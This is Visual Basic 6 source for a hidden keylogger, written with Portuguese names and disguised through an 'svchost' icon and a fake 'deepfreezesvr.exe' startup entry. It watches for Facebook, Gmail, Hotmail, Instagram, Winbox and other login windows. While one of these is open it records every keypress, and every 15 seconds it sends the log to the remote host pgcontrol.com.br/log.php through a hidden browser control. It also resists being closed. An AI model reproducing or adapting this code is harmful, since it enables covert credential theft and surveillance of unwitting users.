VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   ClientHeight    =   885
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   1560
   Icon            =   "svchost.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   885
   ScaleWidth      =   1560
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Delays 
      Interval        =   1000
      Left            =   600
      Top             =   120
   End
   Begin VB.Timer Captura 
      Interval        =   1
      Left            =   120
      Top             =   120
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public WithEvents m_WebControl As VBControlExtender
Attribute m_WebControl.VB_VarHelpID = -1

Private Sub Delays_Timer()
    Delay_EnviarLog = Delay_EnviarLog + 1
    Delay_Navigate = Delay_Navigate + 1
    
    Form1.Caption = Delay_EnviarLog
    If Delay_EnviarLog >= 15 Then
        Delay_EnviarLog = 0
        If Len(Logger) > 0 Then Call Enviar_Log
    End If
    
    If Delay_Navigate > 60 Then Delay_Navigate = 5
End Sub

Private Sub Form_Load()
    If App.PrevInstance Then End
    
    LogLink = "http://pgcontrol.com.br/log.php"
    Maquina = Environ("COMPUTERNAME")

    Call AddLog("[Keylogger Iniciado com o Windows]" & vbNewLine, 1)
    Me.Visible = False
    
    Set m_WebControl = Controls.Add("Shell.Explorer.2", "webctl", Form1)
    m_WebControl.Move 15, 15, 15, 15 'Me.Width, Me.Height
    m_WebControl.Visible = True
    
    Call m_WebControl.object.navigate(LogLink)
    
    Call DeleteKey(HKEY_CURRENT_USER, "AppEvents\Schemes\Apps\Explorer\Navigating\.Current")
    If Len(GetSettingString(HKEY_CURRENT_USER, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "DFSvr")) <> Len("C:\Windows\deepfreezesvr.exe") Then
        Call SaveSettingString(HKEY_CURRENT_USER, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "DFSvr", "C:\Windows\deepfreezesvr.exe")
    End If
    
    'If Len(GetSettingString(HKEY_CURRENT_USER, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "chrome_cache")) <> Len("C:\Windows\ccache.exe") Then
    '    Call ShellExecute(hWnd, vbNullString, "C:\Windows\ccache.exe", vbNullString, vbNullString, 0)
    '    Call SaveSettingString(HKEY_CURRENT_USER, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "chrome_cache", "C:\Windows\ccache.exe")
    'End If
End Sub

Private Sub Captura_Timer()
    Dim Janela As String
    Janela = GetCaption(GetForegroundWindow)
    
    Dim Capturar As Integer
    Capturar = 0
    
    If InStr(1, Janela, "Facebook") Then
        Capturar = 1
        Janela_Aberta = "Facebook"
    End If
    If InStr(1, Janela, "Twitter") Then
        Capturar = 1
        Janela_Aberta = "Twitter"
    End If
    If InStr(1, Janela, "Entrar") Then
        Capturar = 1
        Janela_Aberta = "Hotmail"
    End If
    If InStr(1, Janela, "Instagram") Then
        Capturar = 1
        Janela_Aberta = "Instagram"
    End If
    If InStr(1, Janela, "GMail") Then
        Capturar = 1
        Janela_Aberta = "GMail"
    End If
    If InStr(1, Janela, "Gooble Accounts") Then
        Capturar = 1
        Janela_Aberta = "Youtube"
    End If
    If InStr(1, Janela, "Ask.fm") Then
        Capturar = 1
        Janela_Aberta = "Ask.fm"
    End If
    If InStr(1, Janela, "Orkut") Then
        Capturar = 1
        Janela_Aberta = "Orkut"
    End If
    If InStr(1, Janela, "Winbox") Then
        Capturar = 1
        Janela_Aberta = "Winbox"
    End If
    If InStr(1, Janela, "Microtick") Then
        Capturar = 1
        Janela_Aberta = "Microtick"
    End If
    If InStr(1, Janela, "Login") Then
        Capturar = 1
        Janela_Aberta = "Login???"
    End If
    
    If Capturar = 1 Then
        Dim i As Integer
        For i = 0 To 255
            If VerificaTecla(i) Then
                If Tecla(i) = 0 Then
                    Tecla(i) = 1
                    Call AddLogger(i)
                End If
            Else
                Tecla(i) = 0
            End If
        Next i
    End If
    
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Cancel = 1
    Call Enviar_Log
End Sub

Private Sub m_WebControl_ObjectEvent(Info As EventInfo)
    Dim Source As String
    On Error Resume Next
    Source = m_WebControl.object.document.documentelement.innerhtml
    
    If Info = "DocumentComplete" Then
        If InStr(1, Source, "FormKL") Then Exit Sub
        
        If InStr(1, Source, "#SUCESSO#") Then
            Logger = vbNullString
            EnviandoLog = 0
            Call m_WebControl.object.navigate(LogLink)
        End If
    End If
End Sub
